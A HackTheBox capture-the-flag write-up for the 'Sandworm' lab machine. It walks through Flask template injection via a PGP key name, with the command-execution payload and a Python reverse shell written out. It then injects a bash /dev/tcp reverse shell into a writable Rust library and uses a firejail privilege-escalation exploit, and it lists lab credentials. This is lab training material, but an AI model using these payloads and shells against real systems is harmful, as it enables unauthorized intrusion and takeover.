# [Sandworm](https://app.hackthebox.com/machines/Sandworm) - 25/08/2023 - HackTheBox write-up

IP : `10.10.11.218`
Name : `ssa.htb`

## User flag

### Discovery

On the machine there is only an HTTP and a SSH server, so it will be a web exploitation. On the website we can find a Flask application, a home page, an about page and a contact page.

The contact page allow us to send a PGP encrypted message, using their public key. To help us, there is a guide page that explain how to encrypt, decrypt and verify a signature, and we can do all this actions by submitting forms.

### Searching for vulnerability

Because the app use Flask, it's probably a template injection, so we need to find the entry point. First, I searched in the contact form directly, without success. Then, I tried the "decrypt message" form because the decrypted message is print on the page, but it didn't work.

Finally, I tried the "verify signature" feature, trying to inject Python code in the signed message. It didn't work either. But I noticed that the real-name of the public key is shown in the message if signature verification succeed. And by submitting a key and a signed message with real-name : `{{ 7*'7' }}`, it works and we receive `"7777777"`.

### Exploitation

The steps to run a command with this exploit are annoying, so I wrote a script to make it easier (see `exploit.sh`). It will create a key with the given payload, or a reverse shell by default, sign a message and send them to the server. Because the payload is send in the key, there was some difficulties with encoding and formats, so I decided to send base64 encoded payload, and return base64 encoded result.

I used the following payload to execute commands :
```bash
# Any basic command
cmd="ls -la"
{{request["application"]["__globals__"]["__builtins__"]["__import__"]("os")["popen"]("echo $('${cmd}' | base64 -w 0)")["read"]()}}

# Python reverse shell (could do it in Bash but Python is just more RP)
b64_revshell=$(echo 'import os,pty,socket;s=socket.socket();s.connect(("'${HOST}'",'${PORT}'));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")' | base64 -w 0)
cmd="echo '${b64_revshell}' | base64 -d | python3"
```

After these steps, I could connect to the server as `atlas`, but there isn't any `user.txt`. There is another user, `silentobserver`, so we need to find his password.

There is a very few binaries available as `atlas`, so I have no ideas how to become `silentobserver`. But after a few researches in the file system, I've found a strange `admin.json` in the `.config` directory, and we can find credentials in it. Finally, by testing it on the SSH, we could connect as `silentobserver` and get the flag.

Credentials: `silentobserver:quietLiketheWind22`.

## Root flag

When searching for a way to became `silentobserver` for the user flag step, I found that the machine use ̀`firejail` to isolate the wep app running by `atlas` in another environment. There is a recent CVE on this program that allow a user who can run `firejail` to become `root` (*CVE-2022-31214*).

But after trying the POC I've found ([link](https://www.openwall.com/lists/oss-security/2022/06/08/10/1)), I figured out that `silentobserver` cannot run `firejail`. But `atlas` cannot run `firejail` inside the restricted environment, so we need to find another access.

### Searching for elevating privileges

After some researches, we can find an executable with the suid bit with `atlas` as owner: `/opt/tipnet/target/debug/tipnet`. It's Rust code and the tool isn't writeable to add command execution. But, by inspecting the code, we can find that the program uses a logger library in `/opt/crates/logger/src/lib.rs`, and is writeable.

So, we can inject some code in the library to obtain a reverse shell as `atlas` by editing `/opt/crates/logger/src/lib.rs`:
```rust
use std::process:Command;

let output = Command::new("bash")
    .arg("-p")
    .arg("-c")
    .arg("bash -i >& /dev/tcp/<IP>/<PORT> 0>&1")
    .output()
    .expect("not work");
```

With a `netcat` we can then obtain a reverse shell as `atlas`. To make it easier, I added a SSH key to `.ssh/authorized_keys` to have a SSH connection.

### Exploitation

Now, I can just run the previous exploit for the CVE:
```bash
$ chmod u+x CVE-2022-31214.py
$ python3 CVE-2022-31214.py
You can now run 'firejail --join=<PID>' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

In another terminal:
```bash
atlas@sandworm:~$ firejail --join=<PID>
changing root to /proc/<PID>/root
Warning: cleaning all supplementary groups
Child process initialized in 9.92 ms
atlas@sandworm:~$ su root
root@sandworm:~$ # we are root
```

Finally we are root and can get the flag.
